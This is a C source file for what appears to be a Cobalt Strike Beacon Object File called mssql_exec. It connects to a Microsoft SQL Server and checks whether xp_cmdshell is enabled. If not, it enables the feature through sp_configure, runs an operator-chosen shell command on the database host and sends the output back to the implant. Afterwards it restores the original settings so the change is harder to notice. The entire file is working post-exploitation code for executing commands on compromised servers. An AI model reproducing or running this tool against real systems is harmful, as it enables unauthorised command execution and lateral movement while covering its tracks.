/*
 * mssql_exec — execute a shell command on the SQL host via xp_cmdshell.
 *
 * State machine:
 *   1. Read xp_cmdshell + show advanced options state from sys.configurations
 *   2. If disabled and --no-enable not set, enable both via sp_configure
 *   3. EXEC xp_cmdshell '<cmd>'
 *   4. Capture output column, trim NULL rows
 *   5. If --no-restore not set, restore prior state of both options
 *
 * Usage:
 *   mssql_exec <host> "<cmd>"
 *   mssql_exec SQL01 "whoami"
 *   mssql_exec SQL01 --no-restore "ipconfig /all"
 *   mssql_exec SQL01 --no-enable "echo hi"
 */

#include <winsock2.h>
#include <windows.h>
#include "../bof_compat/beacon.h"
#include "../common/dynimports.h"
#include "../common/args.h"
#include "../tds/tds.h"

static void ascii_to_wide(const char *in, wchar_t *out, size_t outlen) {
    size_t i = 0;
    for (; i < outlen - 1 && in && in[i]; ++i) out[i] = (wchar_t)(unsigned char)in[i];
    out[i] = 0;
}

static int run_simple(tds_conn_t *c, const wchar_t *sql) {
    tds_result_t *r = NULL;
    int rc = tds_query(c, sql, &r);
    if (r) tds_result_free(r);
    return rc;
}

static int read_int_config(tds_conn_t *c, const wchar_t *option, int64_t *out) {
    wchar_t sql[256] = L"SELECT CAST(value_in_use AS INT) FROM sys.configurations WHERE name = '";
    size_t pos = 0; while (sql[pos]) ++pos;
    for (int i = 0; option[i] && pos < 250; ++i) sql[pos++] = option[i];
    sql[pos++] = L'\''; sql[pos] = 0;
    tds_result_t *r = NULL;
    int rc = tds_query(c, sql, &r);
    if (rc != TDS_OK || !r) { if (r) tds_result_free(r); return rc; }
    if (tds_result_next_row(r) != 1) { tds_result_free(r); return TDS_ERR_PROTOCOL; }
    rc = tds_result_get_i64(r, 0, out);
    tds_result_free(r);
    return rc;
}

void go(char *args, int alen) {
    bof_args_t a;
    bof_args_init(&a, args, alen);
    const char *host = bof_args_str_pos(&a, 0);
    const char *cmd  = bof_args_str_pos(&a, 1);
    int port = bof_args_int_flag(&a, "--port", 1433);
    int no_restore = bof_args_bool_flag(&a, "--no-restore");
    int no_enable  = bof_args_bool_flag(&a, "--no-enable");

    if (!host || !cmd) {
        BeaconPrintf(CALLBACK_ERROR,
                     "[!] usage: mssql_exec <host> <cmd> [--no-restore] [--no-enable]");
        return;
    }
    wchar_t whost[256];
    ascii_to_wide(host, whost, 256);

    tds_conn_t *c = NULL;
    int rc = tds_connect(whost, (uint16_t)port, NULL, NULL, &c);
    if (rc != TDS_OK) {
        BeaconPrintf(CALLBACK_ERROR, "[!] connect failed: %ls", tds_last_error(c));
        if (c) tds_close(c);
        return;
    }

    int64_t prev_show = 0, prev_xp = 0;
    if (read_int_config(c, L"show advanced options", &prev_show) != TDS_OK ||
        read_int_config(c, L"xp_cmdshell", &prev_xp) != TDS_OK) {
        BeaconPrintf(CALLBACK_ERROR, "[!] cannot read sys.configurations: %ls", tds_last_error(c));
        tds_close(c);
        return;
    }

    if (!prev_xp) {
        if (no_enable) {
            BeaconPrintf(CALLBACK_ERROR, "[!] xp_cmdshell disabled and --no-enable set");
            tds_close(c);
            return;
        }
        if (!prev_show)
            run_simple(c, L"EXEC sp_configure 'show advanced options', 1; RECONFIGURE;");
        run_simple(c, L"EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;");
    }

    /* Build EXEC xp_cmdshell '<cmd>' on heap to avoid large stack frame. */
    wchar_t *sql = (wchar_t*)MSVCRT$malloc(8192 * sizeof(wchar_t));
    if (!sql) { tds_close(c); return; }
    size_t pos = 0;
    const wchar_t *p = L"EXEC xp_cmdshell '";
    while (*p && pos < 8180) sql[pos++] = *p++;
    for (size_t i = 0; cmd[i] && pos < 8180; ++i) {
        if (cmd[i] == '\'') sql[pos++] = L'\'';
        sql[pos++] = (wchar_t)(unsigned char)cmd[i];
    }
    sql[pos++] = L'\'';
    sql[pos] = 0;

    tds_result_t *r = NULL;
    rc = tds_query(c, sql, &r);
    MSVCRT$free(sql);
    if (rc != TDS_OK || !r) {
        BeaconPrintf(CALLBACK_ERROR, "[!] xp_cmdshell failed");
        if (r) tds_result_free(r);
    } else {
        wchar_t *line = (wchar_t*)MSVCRT$malloc(2048 * sizeof(wchar_t));
        if (line) {
            while (tds_result_next_row(r) == 1) {
                if (tds_result_is_null(r, 0)) continue;
                tds_result_get_str(r, 0, line, 2048);
                BeaconPrintf(CALLBACK_OUTPUT, "%ls", line);
            }
            MSVCRT$free(line);
        }
        tds_result_free(r);
    }

    if (!no_restore) {
        if (!prev_xp)   run_simple(c, L"EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;");
        if (!prev_show) run_simple(c, L"EXEC sp_configure 'show advanced options', 0; RECONFIGURE;");
    }

    tds_close(c);
}
